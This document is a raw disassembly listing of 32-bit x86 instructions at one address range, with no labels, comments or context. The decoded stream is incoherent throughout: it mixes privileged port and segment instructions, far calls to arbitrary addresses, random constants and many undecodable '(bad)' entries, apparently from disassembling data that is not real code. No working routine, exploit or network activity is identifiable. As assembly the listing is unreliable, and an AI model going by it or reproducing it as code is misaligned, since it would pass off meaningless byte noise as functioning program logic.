  4b7bb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b7bb9:	and    ecx,0x558022fe
  4b7bbf:	adc    al,0xc6
  4b7bc1:	pop    ss
  4b7bc2:	lock adc BYTE PTR [esi+esi*4+0xa],cl
  4b7bc7:	imul   esp,DWORD PTR [esi+esi*4+0x1c3867a0],0xffffff89
  4b7bcf:	inc    ebp
  4b7bd0:	adc    edx,esi
  4b7bd2:	cwde   
  4b7bd3:	or     al,0x7d
  4b7bd5:	imul   edx,DWORD PTR [ecx],0xe076184d
  4b7bdb:	pop    esi
  4b7bdc:	ins    DWORD PTR es:[edi],dx
  4b7bdd:	add    edi,esi
  4b7bdf:	jae    0x4b7ba7
  4b7be1:	and    DWORD PTR [ebx],esp
  4b7be3:	jne    0x4b7c1d
  4b7be5:	es mov ebp,0x626df77b
  4b7beb:	jb     0x4b7bef
  4b7bed:	add    DWORD PTR [esi-0x15],eax
  4b7bf0:	aam    0x38
  4b7bf2:	sbb    al,BYTE PTR [ebp-0x66]
  4b7bf5:	sbb    al,dh
  4b7bf7:	mov    ah,0xee
  4b7bf9:	cdq    
  4b7bfa:	fisttp QWORD PTR [edx+0x1a]
  4b7bfd:	mov    esp,0x5db81aaa
  4b7c02:	push   es
  4b7c03:	push   edx
  4b7c04:	sbb    al,0x60
  4b7c06:	pop    edx
  4b7c07:	add    edi,DWORD PTR [esi-0xbb9a956]
  4b7c0d:	sbb    al,0xb3
  4b7c0f:	jnp    0x4b7bd7
  4b7c11:	xchg   esi,eax
  4b7c12:	mov    es,WORD PTR ds:0xc471cfe3
  4b7c18:	inc    edx
  4b7c19:	add    BYTE PTR ds:0x144428d2,ch
  4b7c1f:	cs dec edx
  4b7c21:	push   ebx
  4b7c22:	fucom  st(1)
  4b7c24:	xor    ebp,DWORD PTR [esi]
  4b7c26:	or     eax,0xbd04c499
  4b7c2b:	sahf   
  4b7c2c:	das    
  4b7c2d:	jns    0x4b7c8f
  4b7c2f:	bound  edx,QWORD PTR [edx+0x50]
  4b7c32:	inc    edi
  4b7c33:	cmp    edi,0xffffffff
  4b7c36:	and    ah,bl
  4b7c38:	add    BYTE PTR [esi-0x10],al
  4b7c3b:	popf   
  4b7c3c:	jo     0x4b7c63
  4b7c3e:	sahf   
  4b7c3f:	push   0x899888f9
  4b7c44:	add    al,BYTE PTR [eax]
  4b7c46:	clc    
  4b7c47:	les    eax,FWORD PTR [ebx]
  4b7c49:	call   0x5581:0x3e0e312
  4b7c50:	lahf   
  4b7c51:	inc    DWORD PTR [esi]
  4b7c53:	sub    DWORD PTR [edi+0x8],0xffffffa7
  4b7c57:	pop    edx
  4b7c58:	adc    al,0x71
  4b7c5a:	pop    eax
  4b7c5b:	push   cs
  4b7c5c:	das    
  4b7c5d:	or     BYTE PTR [eax+ebx*1+0x2c3a3315],bl
  4b7c64:	cld    
  4b7c65:	sbb    ecx,DWORD PTR [esi+edx*1]
  4b7c68:	mov    al,0x73
  4b7c6a:	jmp    0x4b7cd2
  4b7c6c:	cmp    BYTE PTR [edi+0xcb9c3d9],0x63
  4b7c73:	imul   BYTE PTR [edx]
  4b7c75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b7c76:	add    BYTE PTR ds:0x8430e0a6,ch
  4b7c7c:	dec    edi
  4b7c7d:	loopne 0x4b7cdb
  4b7c7f:	jo     0x4b7cf7
  4b7c81:	push   ebx
  4b7c83:	or     al,0x89
  4b7c85:	or     dh,BYTE PTR [edx]
  4b7c87:	sub    edi,DWORD PTR [ecx]
  4b7c89:	push   eax
  4b7c8a:	add    ecx,DWORD PTR [ebp+0xc]
  4b7c8d:	mov    ebx,0x2e01f020
  4b7c92:	test   edi,ebx
  4b7c94:	push   ebp
  4b7c95:	das    
  4b7c96:	jnp    0x4b7cb0
  4b7c98:	rol    BYTE PTR [edx],cl
  4b7c9a:	push   ebp
  4b7c9b:	fbstp  TBYTE PTR [edx]
  4b7c9d:	adc    BYTE PTR [ebp+0x3c],ch
  4b7ca0:	fstp   TBYTE PTR [edx]
  4b7ca2:	add    BYTE PTR [eax],ah
  4b7ca4:	add    BYTE PTR [esp+eax*1-0xe7a4f18],ch
  4b7cab:	dec    eax
  4b7cac:	or     dl,BYTE PTR [edi+ebx*8]
  4b7caf:	sbb    al,0x48
  4b7cb1:	xor    al,0xd0
  4b7cb3:	or     DWORD PTR [ebx],ecx
  4b7cb5:	imul   esi,DWORD PTR [ebx+edi*8+0x2b0134a],0x6f71862b
  4b7cc0:	shr    BYTE PTR [edx-0xfaf5be2],1
  4b7cc6:	push   ecx
  4b7cc7:	push   edx
  4b7cc8:	sub    al,0x93
  4b7cca:	ret    0x264e
  4b7ccd:	cmp    ebx,ebx
  4b7ccf:	gs jecxz 0x4b7ced
  4b7cd2:	ins    DWORD PTR es:[edi],dx
  4b7cd3:	sbb    eax,0x8c3e35cf
  4b7cd8:	push   esi
  4b7cd9:	or     bl,BYTE PTR [eax+0x60]
  4b7cdc:	add    al,0xac
  4b7cde:	jecxz  0x4b7ca7
  4b7ce0:	fadd   st,st(2)
  4b7ce2:	inc    esp
  4b7ce3:	loopne 0x4b7d3c
  4b7ce5:	mov    bh,0x8b
  4b7ce7:	xlat   BYTE PTR ds:[ebx]
  4b7ce8:	xchg   ecx,eax
  4b7ce9:	push   ss
  4b7cea:	sbb    ebp,DWORD PTR [ebx-0x11]
  4b7ced:	test   al,0x35
  4b7cef:	mov    al,ds:0xf6575701
  4b7cf4:	push   edi
  4b7cf5:	imul   ebp,DWORD PTR [ebp-0x6920acfd],0x97cc0962
  4b7cff:	rcl    dl,1
  4b7d01:	rol    BYTE PTR [ebp-0x76b0a899],1
  4b7d07:	or     eax,0x5cd902c
  4b7d0c:	xor    ebx,DWORD PTR [eax-0x27]
  4b7d0f:	js     0x4b7d35
  4b7d11:	sub    DWORD PTR [edx+0xc13df69],esi
  4b7d17:	ds test eax,0x6c7f7052
  4b7d1d:	jo     0x4b7d5f
  4b7d1f:	push   ecx
  4b7d20:	lock or eax,0xbcc7b1a4
  4b7d26:	add    ebx,0x7c
  4b7d29:	fldenv [eax-0xecb9e7f]
  4b7d2f:	ret    
  4b7d30:	nop
  4b7d31:	xchg   ah,al
  4b7d33:	push   0x67
  4b7d35:	pop    ss
  4b7d36:	sub    BYTE PTR [edx+0x2a],al
  4b7d39:	sbb    BYTE PTR [eax-0x29],al
  4b7d3c:	pop    eax
  4b7d3d:	add    eax,edx
  4b7d3f:	sub    DWORD PTR [eax+eax*1+0x1310472e],ebx
  4b7d46:	push   eax
  4b7d47:	xchg   ebx,eax
  4b7d48:	add    ecx,DWORD PTR [eax+0x5d0a38c6]
  4b7d4e:	fs cmp al,0x84
  4b7d51:	jns    0x4b7cf1
  4b7d53:	add    BYTE PTR [ecx-0x6b84e63e],ah
  4b7d59:	mov    DWORD PTR [ebp+0x75d81a90],esp
  4b7d5f:	dec    edx
  4b7d60:	cmp    dl,BYTE PTR [edx]
  4b7d62:	(bad)  
  4b7d63:	fadd   QWORD PTR [ecx]
  4b7d65:	mov    bl,0xe
  4b7d67:	xchg   DWORD PTR [esi],ecx
  4b7d69:	jb     0x4b7d3d
  4b7d6b:	sbb    edx,DWORD PTR [ebx]
  4b7d6d:	clc    
  4b7d6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b7d6f:	sbb    eax,0xc1a539e8
  4b7d74:	ret    
  4b7d75:	(bad)  
  4b7d76:	imul   ebp,DWORD PTR [esi],0xffffffdc
  4b7d79:	sar    DWORD PTR [eax+0x42de80b7],cl
  4b7d7f:	imul   eax,DWORD PTR [eax+ecx*4-0x5ce871b6],0x695cfd21
  4b7d8a:	loop   0x4b7dbc
  4b7d8c:	add    ebx,edi
  4b7d8e:	jp     0x4b7dd4
  4b7d90:	inc    eax
  4b7d91:	add    esp,DWORD PTR [eax]
  4b7d93:	xor    ah,BYTE PTR [ebp-0x1fc48169]
  4b7d99:	adc    DWORD PTR [eax+0x3b],eax
  4b7d9c:	or     al,0xf6
  4b7d9e:	sub    al,0xe3
  4b7da0:	popa   
  4b7da1:	sub    eax,0x8bf14023
  4b7da6:	add    cl,BYTE PTR [eax]
  4b7da8:	enter  0x8904,0x66
  4b7dac:	push   ds
  4b7dad:	inc    ecx
  4b7dae:	pop    ebx
  4b7daf:	cwde   
  4b7db0:	add    BYTE PTR [ebx+0x7748f981],ah
  4b7db6:	aas    
  4b7db7:	xor    bl,BYTE PTR [edi]
  4b7db9:	ins    BYTE PTR es:[edi],dx
  4b7dba:	mov    ecx,0x82842492
  4b7dbf:	mov    ebx,0xaa500f00
  4b7dc4:	jl     0x4b7e08
  4b7dc6:	sbb    BYTE PTR [esi-0x6e89db7b],bh
  4b7dcc:	mov    eax,0xeb721c42
  4b7dd1:	jo     0x4b7ded
  4b7dd3:	ret    0x47b2
  4b7dd6:	pop    eax
  4b7dd7:	mov    esi,0x2000e1db
  4b7ddc:	fcom   DWORD PTR [ebx+eax*1+0x36]
  4b7de0:	xor    eax,0x7781272d
  4b7de5:	loopne 0x4b7d68
  4b7de7:	push   0xffffff82
  4b7de9:	scas   eax,DWORD PTR es:[edi]
  4b7dea:	je     0x4b7e02
  4b7dec:	pop    esi
  4b7ded:	dec    ebp
  4b7dee:	imul   ebx,DWORD PTR [ebx],0x651a7562
  4b7df4:	cld    
  4b7df5:	lea    ebp,[ecx+0x38]
  4b7df8:	into   
  4b7df9:	test   DWORD PTR fs:[ebp*8+0x41a7449],0x3f1fbc07
  4b7e05:	sti    
  4b7e06:	(bad)  
  4b7e07:	add    BYTE PTR [edx],bh
  4b7e09:	leave  
  4b7e0a:	xchg   edi,eax
  4b7e0b:	pop    ds
  4b7e0c:	std    
  4b7e0d:	mov    ecx,edx
  4b7e0f:	pop    edi
  4b7e10:	mov    esp,eax
  4b7e12:	setnp  dl
  4b7e15:	sub    eax,0x211b347
  4b7e1a:	sub    DWORD PTR [ebx-0x1],0x3d
  4b7e1e:	jae    0x4b7db0
  4b7e20:	or     ebx,DWORD PTR [edi-0xff0db8a]
  4b7e26:	pop    ebp
  4b7e27:	cmp    DWORD PTR [edi],0x2c75a6b0
  4b7e2d:	xor    eax,0x207c29c9
  4b7e32:	add    dl,BYTE PTR ds:0x35889205
  4b7e38:	and    BYTE PTR [eax],bh
  4b7e3a:	cmp    ch,BYTE PTR [eax+0x4b]
  4b7e3d:	push   edx
  4b7e3e:	mov    bh,0x0
  4b7e40:	mov    ds:0xbdc22662,al
  4b7e45:	daa    
  4b7e46:	pop    ecx
  4b7e47:	rol    BYTE PTR ds:0x3a5f007b,0x50
  4b7e4e:	or     eax,DWORD PTR [ecx+0x14]
  4b7e51:	add    BYTE PTR [esi+0x74],al
  4b7e54:	or     eax,0x2c80264c
  4b7e59:	xchg   DWORD PTR [esi],ebx
  4b7e5b:	les    esp,FWORD PTR [esi+ebx*1]
  4b7e5e:	push   0xd6bb08b
  4b7e63:	mov    ebp,0x3dfd9f0f
  4b7e68:	or     bl,BYTE PTR es:[edx]
  4b7e6b:	and    eax,0x4149f18c
  4b7e70:	dec    esp
  4b7e71:	mov    ecx,DWORD PTR [eax+ecx*2+0x176a2b87]
  4b7e78:	leave  
  4b7e79:	and    ch,BYTE PTR [esi+0x69]
  4b7e7c:	push   cs
  4b7e7d:	fdiv   QWORD PTR [edx-0x4a2c7a7e]
  4b7e83:	addr16 call 0x2dfdb182
  4b7e89:	cmp    DWORD PTR [eax],ebp
  4b7e8b:	push   eax
  4b7e8c:	cs test cl,ah
  4b7e8f:	les    eax,FWORD PTR [ebx]
  4b7e91:	pmaxsw mm2,QWORD PTR [ebx]
  4b7e94:	jne    0x4b7ea0
  4b7e96:	mov    ebx,0x83b422d4
  4b7e9b:	mov    edx,0xbb692c0b
  4b7ea0:	and    al,BYTE PTR [edi]
  4b7ea2:	push   0x3693fe4
  4b7ea7:	and    eax,DWORD PTR [eax-0xb44ec10]
  4b7ead:	push   eax
  4b7eae:	push   edi
  4b7eaf:	nop
  4b7eb0:	inc    ebx
  4b7eb1:	repnz mov ebx,0x50eb07e4
  4b7eb7:	push   ecx
  4b7eb8:	or     BYTE PTR [ecx+0x18],dl
  4b7ebb:	push   ecx
  4b7ebc:	in     al,0xb
  4b7ebe:	stc    
  4b7ebf:	mov    ecx,0x34680a27
  4b7ec4:	inc    eax
  4b7ec5:	mov    ebx,0x12c2d34c
  4b7eca:	or     bh,BYTE PTR es:[edi+edi*2-0x45dbb38e]
  4b7ed2:	add    eax,0x8a35500b
  4b7ed7:	int3   
  4b7ed8:	lea    ebp,[ecx+0x32d9dd9]
  4b7ede:	sbb    eax,0x23ad5b56
  4b7ee3:	sub    dh,bh
  4b7ee5:	sahf   
  4b7ee6:	nop
  4b7ee7:	pop    es
  4b7ee8:	mov    bl,BYTE PTR [ecx+edx*2+0x2a]
  4b7eec:	mov    ebx,0x5eb2264
  4b7ef1:	mov    ebx,0xf63c24b8
  4b7ef6:	or     bl,BYTE PTR [ecx-0x41]
  4b7ef9:	jo     0x4b7eca
  4b7efb:	ret    0xcc3c
  4b7efe:	ins    BYTE PTR es:[edi],dx
  4b7eff:	imul   edi,DWORD PTR [edx-0x1368232f],0x818c74bb
  4b7f09:	daa    
  4b7f0a:	push   ecx
  4b7f0b:	and    eax,0xb8162580
  4b7f10:	mov    fs:0xa06b51fd,eax
  4b7f16:	sub    cl,BYTE PTR [esi]
  4b7f18:	xor    eax,0x89f74904
  4b7f1d:	add    DWORD PTR [eax+eax*8],esi
  4b7f20:	inc    edx
  4b7f21:	loope  0x4b7f30
  4b7f23:	mov    eax,ds:0x12e03294
  4b7f28:	jg     0x4b7f25
  4b7f2a:	push   ss
  4b7f2b:	sbb    esp,DWORD PTR [ecx+0x5d]
  4b7f2e:	jmp    0x4b7f71
  4b7f30:	xor    esi,esi
  4b7f32:	fisubr WORD PTR ds:0xa8fd056c
  4b7f38:	in     al,0x89
  4b7f3a:	mov    bl,0x91
  4b7f3c:	mov    bl,0xd8
  4b7f3e:	lds    edi,FWORD PTR [eax+0x5721b8b8]
  4b7f44:	jae    0x4b7f9a
  4b7f46:	and    eax,0x38587e43
  4b7f4b:	bound  edi,QWORD PTR [ebp+0x124ba4ab]
  4b7f51:	mov    dh,0xe4
  4b7f53:	retf   
  4b7f54:	repz xchg ebx,eax
  4b7f56:	push   esi
  4b7f57:	cwde   
  4b7f58:	inc    ebp
  4b7f59:	xchg   edi,eax
  4b7f5a:	or     DWORD PTR [ebx],eax
  4b7f5c:	push   edi
  4b7f5d:	or     BYTE PTR [edx],0x9a
  4b7f60:	ja     0x4b7f52
  4b7f62:	rcr    DWORD PTR [ebx+ebx*2],cl
  4b7f65:	sar    bh,0x51
  4b7f68:	sub    eax,0xc683945d
  4b7f6d:	(bad)  
  4b7f6e:	rcr    BYTE PTR [ecx+0x3a],1
  4b7f71:	add    eax,0xda7589e7
  4b7f76:	xor    BYTE PTR [esi-0x51863990],dh
  4b7f7c:	pop    es
  4b7f7d:	call   0x44d56fc0
  4b7f82:	or     dl,BYTE PTR [edi-0x6]
  4b7f85:	imul   edx,DWORD PTR [edi+ecx*1+0xa],0x68cc62eb
  4b7f8d:	sbb    al,0x50
  4b7f8f:	inc    ebp
  4b7f90:	sbb    BYTE PTR [ebx-0x7ca05a79],al
  4b7f96:	mov    ebx,DWORD PTR [edi+0x1]
  4b7f99:	arpl   WORD PTR [ebx-0xdadd674],si
  4b7f9f:	xor    al,0x7b
  4b7fa1:	jmp    0x4b7f58
  4b7fa3:	jl     0x4b7ffd
  4b7fa5:	sub    BYTE PTR [edx+0x21],dl
  4b7fa8:	int    0x93
  4b7faa:	xchg   bh,al
  4b7fac:	pop    eax
  4b7fad:	pushf  
  4b7fae:	enter  0x4f25,0xf3
  4b7fb2:	mov    BYTE PTR [ebp+0x4451384d],cl
  4b7fb8:	sbb    al,0xe0
  4b7fba:	inc    ecx
  4b7fbb:	ret    0x6f10
  4b7fbe:	int    0xbd
  4b7fc0:	je     0x4b7fce
  4b7fc2:	and    DWORD PTR [esi+0x6980f406],esi
  4b7fc8:	inc    edx
  4b7fc9:	sub    ecx,0x64
  4b7fcc:	daa    
  4b7fcd:	dec    edx
  4b7fce:	or     edx,DWORD PTR [eax-0x14efa2d2]
  4b7fd4:	mov    cl,0x50
  4b7fd6:	mov    cs,edx
  4b7fd8:	int3   
  4b7fd9:	mov    ah,0x8a
  4b7fdb:	mov    WORD PTR [edi+0x5c84832c],?
  4b7fe1:	adc    BYTE PTR [edi-0x4d],ah
  4b7fe4:	pop    ss
  4b7fe5:	shl    al,cl
  4b7fe7:	xchg   ecx,eax
  4b7fe8:	mov    edx,0x58cbcc84
  4b7fed:	push   ds
  4b7fee:	adc    BYTE PTR fs:[ecx],0x96
  4b7ff2:	sbb    DWORD PTR [eax-0x2f],0x41e4b7ac
  4b7ff9:	push   ss
  4b7ffa:	gs (bad) 
  4b7ffc:	fs push eax
  4b7ffe:	retf   
  4b7fff:	or     al,0x99
  4b8001:	in     al,0xc9
  4b8003:	inc    ebp
  4b8004:	inc    eax
  4b8005:	push   eax
  4b8006:	fmul   st(2),st
  4b8008:	into   
  4b8009:	test   DWORD PTR [eax+esi*1],ebx
  4b800c:	push   0xe407d121
  4b8011:	or     al,BYTE PTR [esi+0x6ce03728]
  4b8017:	push   eax
  4b8018:	xor    al,0x4f
  4b801a:	mov    esi,0x4d6b25
  4b801f:	add    DWORD PTR [ecx+0x21],edx
  4b8022:	(bad)  
  4b8024:	xchg   ebx,eax
  4b8025:	in     al,0x3d
  4b8027:	jo     0x4b8054
  4b8029:	xor    BYTE PTR [edi+0x26b2173],dh
  4b802f:	inc    ebx
  4b8030:	cmp    BYTE PTR [edx+0x18],ah
  4b8033:	nop
  4b8034:	call   0xb4df5ad
  4b8039:	sbb    DWORD PTR [eax-0x772fc2d5],edx
  4b803f:	push   ds
  4b8040:	leave  
  4b8041:	or     al,0xb3
  4b8043:	sbb    ebx,DWORD PTR [edi+0x4]
  4b8046:	outs   dx,DWORD PTR ds:[esi]
  4b8047:	mov    esp,0xb7e24ea8
  4b804c:	sbb    BYTE PTR [edx-0x3f],0x2e
  4b8050:	test   DWORD PTR [ebx+eax*4+0x38],edi
  4b8054:	(bad)  
  4b8055:	cdq    
  4b8056:	sub    bh,ah
  4b8058:	push   ss
  4b8059:	push   edi
  4b805a:	dec    ebx
  4b805b:	mov    DWORD PTR [ebx-0x4f2605d],0x1df6776d
  4b8065:	je     0x4b80ae
  4b8067:	mov    eax,DWORD PTR [ebx-0x69739060]
  4b806d:	mov    eax,ds:0x1fc8f04
  4b8072:	adc    BYTE PTR [edi-0x38],cl
  4b8075:	dec    esp
  4b8076:	adc    cl,al
  4b8078:	sbb    ah,BYTE PTR ds:0x22aabcc
  4b807e:	es jge 0x4b8024
  4b8081:	test   BYTE PTR [eax+0x10],dh
  4b8084:	iret   
  4b8085:	adc    eax,0x5ef13346
  4b808a:	or     bh,bh
  4b808c:	pop    ebx
  4b808d:	inc    eax
  4b808e:	loopne 0x4b8014
  4b8090:	dec    edi
  4b8091:	add    bl,BYTE PTR [edi-0x34]
  4b8094:	cmp    eax,0x2782530a
  4b8099:	lods   eax,DWORD PTR ds:[esi]
  4b809a:	test   DWORD PTR [edi-0xcf71b0],eax
  4b80a0:	xlat   BYTE PTR ds:[ebx]
  4b80a1:	adc    al,0x5
  4b80a3:	out    dx,al
  4b80a4:	popa   
  4b80a5:	xchg   edi,eax
  4b80a6:	fdivr  DWORD PTR [ebx]
  4b80a8:	jmp    0xa7d70ddf
  4b80ad:	xchg   edi,eax
  4b80ae:	adc    eax,0x55b48264
  4b80b3:	inc    edi
  4b80b4:	add    al,0x96
  4b80b6:	lock mov esp,gs
  4b80b9:	adc    bl,BYTE PTR [ebx-0x73e57c7e]
  4b80bf:	dec    ecx
  4b80c0:	sub    al,0x49
  4b80c2:	(bad)  
  4b80c3:	repz jne 0x4b80e6
  4b80c6:	test   BYTE PTR [edx],cl
  4b80c8:	adc    BYTE PTR [ebx],ch
  4b80ca:	push   ss
  4b80cb:	and    eax,DWORD PTR [edi+esi*1+0x2f03a9c6]
  4b80d2:	pop    eax
  4b80d3:	scas   eax,DWORD PTR es:[edi]
  4b80d4:	ret    0x680f
  4b80d7:	cld    
  4b80d8:	(bad)  
  4b80d9:	or     DWORD PTR [ecx+0xd],eax
  4b80dc:	jp     0x4b8101
  4b80de:	add    al,0xbc
  4b80e0:	xchg   BYTE PTR [eax+0x7889f04],dh
  4b80e6:	sbb    bl,BYTE PTR [edi]
  4b80e8:	sub    al,0xf
  4b80ea:	xor    BYTE PTR [edx],0x18
  4b80ed:	ror    DWORD PTR [eax-0x6f],cl
  4b80f0:	sub    DWORD PTR [eax],eax
  4b80f2:	mov    ch,0xd
  4b80f4:	pop    ebp
  4b80f5:	nop
  4b80f6:	data16 jmp 0x4b807e
  4b80f9:	mov    ch,0xa9
  4b80fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b80fc:	imul   edx,DWORD PTR [edx+ebx*4-0x24],0xffffffcf
  4b8101:	push   eax
  4b8102:	ds popa 
  4b8104:	popa   
  4b8105:	into   
  4b8106:	push   edi
  4b8107:	push   cs
  4b8108:	arpl   WORD PTR [eax],dx
  4b810a:	inc    edx
  4b810b:	adc    esp,ebp
  4b810d:	pop    ds
  4b810e:	(bad)  
  4b810f:	pop    ebx
  4b8110:	pop    edx
  4b8111:	cli    
  4b8112:	push   esi
  4b8113:	lods   al,BYTE PTR ds:[esi]
  4b8114:	push   es
  4b8115:	jg     0x4b8178
  4b8117:	test   ah,ah
  4b8119:	ror    DWORD PTR [ebx-0x6daffcf2],0x85
  4b8120:	rol    edx,1
  4b8122:	mov    ebx,0x5680771
  4b8127:	sub    al,0xd5
  4b8129:	loop   0x4b81a2
  4b812b:	sahf   
  4b812c:	cmp    DWORD PTR [ecx+0x2],ebx
  4b812f:	and    ch,BYTE PTR [ebx-0x73fd6908]
  4b8135:	ja     0x4b80b9
  4b8137:	ror    BYTE PTR [ebx+0x61175374],cl
  4b813d:	cs mov edi,0x7008b85f
  4b8143:	cmp    eax,0x56d40611
  4b8148:	cmp    DWORD PTR [eax+ebx*8+0x40],ebx
  4b814c:	gs jge 0x4b81b8
  4b814f:	sub    ecx,DWORD PTR [ebp-0x24]
  4b8152:	test   al,0x19
  4b8154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b8155:	mov    ch,0x44
  4b8157:	jns    0x4b8171
  4b8159:	and    esp,DWORD PTR [ebp-0x40]
  4b815c:	xor    ax,0xac20
  4b8160:	and    eax,0xcbcc10d7
  4b8165:	jb     0x4b816b
  4b8167:	add    al,0x33
  4b8169:	daa    
  4b816a:	lods   eax,DWORD PTR ds:[esi]
  4b816b:	imul   ecx,DWORD PTR [esi+eax*4-0x22a79f5b],0x861c762
  4b8176:	mov    dh,0x43
  4b8178:	lahf   
  4b8179:	pushf  
  4b817a:	mov    al,BYTE PTR [eax]
  4b817c:	les    edi,FWORD PTR [eax-0x28]
  4b817f:	je     0x4b81b1
  4b8181:	into   
  4b8182:	xchg   edx,eax
  4b8183:	lock fs mov bl,0xc6
  4b8187:	lea    ecx,[ecx+edx*2+0x52]
  4b818b:	push   0x23
  4b818d:	fidiv  DWORD PTR [edi]
  4b818f:	sub    al,0x64
  4b8191:	inc    ebp
  4b8192:	test   eax,0x96708667
  4b8197:	jno    0x4b8184
  4b8199:	push   ss
  4b819a:	jle    0x4b81c0
  4b819c:	arpl   WORD PTR [eax-0x1b],bp
  4b819f:	jg     0x4b81fd
  4b81a1:	mov    eax,DWORD PTR [eax]
  4b81a3:	test   BYTE PTR [eax+0x55],cl
  4b81a6:	js     0x4b8198
  4b81a8:	xor    eax,0x30e17615
  4b81ad:	sub    cl,bh
  4b81af:	inc    eax
  4b81b0:	mov    DWORD PTR [edx],edi
  4b81b2:	(bad)  
  4b81b3:	xor    eax,0xa9c69e60
  4b81b8:	(bad)  [ecx+eiz*1]
  4b81bb:	in     al,dx
  4b81bc:	test   BYTE PTR [esi+esi*2+0x25333974],ch
  4b81c3:	sbb    BYTE PTR [edx+0x2baeffcd],bh
  4b81c9:	xor    eax,0x35e01e4e
  4b81ce:	xchg   ebx,eax
  4b81cf:	call   0x176bcfac
  4b81d4:	add    eax,0x2d931407
  4b81d9:	mov    eax,DWORD PTR [ebp-0x672a9f8]
  4b81df:	enter  0x11c2,0x5b
  4b81e3:	stos   DWORD PTR es:[edi],eax
  4b81e4:	adc    al,0x4a
  4b81e6:	add    DWORD PTR [ebp+edx*1+0x4b09d42b],0x5092c1d6
  4b81f1:	push   ecx
  4b81f2:	and    DWORD PTR [edx+0x41],edx
  4b81f5:	loope  0x4b8194
  4b81f7:	push   edi
  4b81f8:	pop    ebp
  4b81f9:	nop
  4b81fa:	dec    esi
  4b81fb:	lock rol BYTE PTR [eax-0x47ff8eda],1
  4b8202:	add    DWORD PTR [ebx+0x704e3f11],0x7c
  4b8209:	test   BYTE PTR [edx],cl
  4b820b:	sbb    ebp,DWORD PTR [edi-0x5d]
  4b820e:	or     eax,0x4c784374
  4b8213:	cmc    
  4b8214:	or     bl,BYTE PTR [esi]
  4b8216:	fwait
  4b8217:	call   0x562b:0xf5be9e8
  4b821e:	std    
  4b821f:	mov    ds:0xb06a68a,eax
  4b8224:	aad    0xd3
  4b8226:	mov    edx,DWORD PTR [edi]
  4b8228:	inc    eax
  4b8229:	and    ah,cl
  4b822b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b822c:	sbb    BYTE PTR [ecx],cl
  4b822e:	push   edx
  4b822f:	dec    esp
  4b8230:	xor    eax,0x5953b788
  4b8235:	in     eax,0x8
  4b8237:	adc    DWORD PTR [eax],0x18
  4b823a:	and    eax,0xc506c09d
  4b823f:	or     dh,BYTE PTR [esi+0x53a2a3f7]
  4b8245:	push   ss
  4b8246:	scas   eax,DWORD PTR es:[edi]
  4b8247:	inc    ebx
  4b8248:	pop    ebx
  4b8249:	sbb    eax,0x1260bfa9
  4b824e:	cmp    BYTE PTR [edi],0x34
  4b8251:	sbb    ebp,0x1c
  4b8254:	pop    edx
  4b8255:	push   es
  4b8256:	xor    ecx,0xffffffaa
  4b8259:	or     DWORD PTR [esi+0x7e79580b],eax
  4b825f:	sub    al,0x49
  4b8261:	ins    BYTE PTR es:[edi],dx
  4b8262:	or     DWORD PTR [ebp+0xe],ecx
  4b8265:	mov    ecx,0x901ee5e
  4b826a:	es ret 0x30db
  4b826e:	mov    edi,0x7c8a7074
  4b8273:	aam    0x63
  4b8275:	jnp    0x4b8230
  4b8277:	mov    WORD PTR [edi+0x770cd2a1],es
  4b827d:	jge    0x4b8281
  4b827f:	mov    esi,DWORD PTR ds:0xd5fe035f
  4b8285:	call   0x962056f
  4b828a:	push   esi
  4b828b:	mov    WORD PTR ds:0xb92b841b,?
  4b8291:	push   eax
  4b8292:	sub    esi,DWORD PTR [eax]
  4b8294:	adc    ebp,DWORD PTR [ecx+eax*4-0x37]
  4b8298:	lods   al,BYTE PTR ds:[esi]
  4b8299:	fs loope 0x4b829e
  4b829c:	(bad)  
  4b829d:	push   ecx
  4b829e:	fcomp  QWORD PTR [ebp+ebx*1-0x296ad359]
  4b82a5:	dec    esp
  4b82a6:	inc    ecx
  4b82a7:	dec    eax
  4b82a8:	pop    edx
  4b82a9:	popf   
  4b82aa:	sar    DWORD PTR [esp+ebp*4],0x49
  4b82ae:	rcr    BYTE PTR [esi+eiz*1],0x16
  4b82b2:	jmp    0x4b8253
  4b82b4:	push   eax
  4b82b5:	inc    edi
  4b82b6:	out    dx,eax
  4b82b7:	and    bh,BYTE PTR [eax-0x1330f9f6]
  4b82bd:	imul   ecx,edi,0xf
  4b82c0:	inc    esi
  4b82c1:	mov    esi,0x4947b815
  4b82c6:	(bad)  
  4b82c8:	dec    eax
  4b82c9:	add    DWORD PTR [ebx],edi
  4b82cb:	scas   eax,DWORD PTR es:[edi]
  4b82cc:	test   al,0x45
  4b82ce:	cmp    esi,DWORD PTR [ecx+0x1f]
  4b82d1:	mov    eax,0xb3233825
  4b82d6:	mov    BYTE PTR [ecx-0x76],bh
  4b82d9:	mov    DWORD PTR [esi+0x40],ebx
  4b82dc:	les    esp,FWORD PTR [ebx]
  4b82de:	xchg   esp,eax
  4b82df:	fst    DWORD PTR [eax+0x52]
  4b82e2:	popf   
  4b82e3:	in     al,dx
  4b82e4:	inc    edx
  4b82e5:	pop    ss
  4b82e6:	sbb    DWORD PTR [ebx-0x4],0xe0cc220b
  4b82ed:	inc    ebp
  4b82ee:	mov    ebp,0x4a112483
  4b82f3:	xor    ecx,ecx
  4b82f5:	add    eax,0x1ad1c60
  4b82fa:	dec    esi
  4b82fb:	add    ecx,DWORD PTR [ebx]
  4b82fd:	test   DWORD PTR [edx-0x5d7be91b],esp
  4b8303:	pop    edi
  4b8304:	push   esi
  4b8305:	mov    bl,BYTE PTR [esi-0x54]
  4b8308:	leave  
  4b8309:	into   
  4b830a:	jne    0x4b832a
  4b830c:	dec    ecx
  4b830d:	mov    ebx,0xb35c280a
  4b8312:	daa    
  4b8313:	fbstp  TBYTE PTR ds:0x12802b14
  4b8319:	leave  
  4b831a:	(bad)  
  4b831b:	stc    
  4b831c:	and    ah,ah
  4b831e:	inc    ebp
  4b831f:	mov    eax,0x86b8794e
  4b8324:	cmp    al,0x5e
  4b8326:	pop    ss
  4b8327:	or     ebx,edi
  4b8329:	mov    ah,0x0
  4b832b:	adc    eax,ecx
  4b832d:	inc    esp
  4b832e:	push   esp
  4b832f:	sti    
  4b8330:	sbb    BYTE PTR [esi+0x2a],bh
  4b8333:	imul   esi,ecx,0xdf58b907
